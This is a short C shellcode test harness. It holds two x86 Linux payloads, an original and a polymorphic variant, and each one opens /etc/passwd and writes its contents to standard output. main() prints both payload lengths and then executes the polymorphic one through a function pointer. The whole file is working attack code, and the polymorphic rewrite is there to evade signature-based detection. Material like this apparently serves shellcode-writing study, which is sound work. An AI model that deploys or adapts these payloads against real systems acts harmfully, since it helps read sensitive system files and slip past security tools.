#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
"\xeb\x32\x5b\xb0\x05\x31\xc9\xcd"
"\x80\x89\xc6\xeb\x06\xb0\x01\x31"
"\xdb\xcd\x80\x89\xf3\xb0\x03\x83"
"\xec\x01\x8d\x0c\x24\xb2\x01\xcd"
"\x80\x31\xdb\x39\xc3\x74\xe6\xb0"
"\x04\xb3\x01\xb2\x01\xcd\x80\x83"
"\xc4\x01\xeb\xdf\xe8\xc9\xff\xff"
"\xff"
"/etc/passwd"


;

unsigned char codepoly[] = \
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x3c\x5b\x04\x0a\x2c\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x08\x31\xc0\xfe\xc0\x31\xdb\xcd\x80\x89\xf3\xb0\x0a\x2c\x07\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe2\xb0\x01\x04\x03\x31\xdb\x43\x31\xd2\x42\xcd\x80\x83\xc4\x01\xeb\xd9\xe8\xbf\xff\xff\xff"
//"\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
"/etc/passwd"
;


main()
{

        printf("Shellcode Length:       %d\n", strlen(code));
	printf("Shellcode Poly Length:  %d\n", strlen(codepoly));



	int (*ret)() = (int(*)())codepoly;
	ret();

}


